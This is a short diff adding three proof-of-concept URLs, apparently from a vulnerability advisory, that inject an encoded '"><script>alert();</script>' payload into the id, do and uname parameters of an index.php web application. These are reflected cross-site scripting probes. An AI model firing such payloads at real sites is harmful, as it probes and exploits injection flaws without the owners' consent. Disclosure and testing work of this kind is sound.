@@ -1,0 +1,5 @@
+http://www.example.com/index.php?module=[target]&amp;do=View&amp;id=&quot;&gt;&lt;script&gt;alert();&lt;/script&gt;
+ 
+http://www.example.com/index.php?module=[target]&amp;do=&quot;&gt;&lt;script&gt;alert();&lt;/script&gt;
+ 
+http://www.example.com/index.php?module=Account&amp;do=UserInfo&amp;uname=&quot;&gt;&lt;script&gt;alert();&lt;/script&gt;
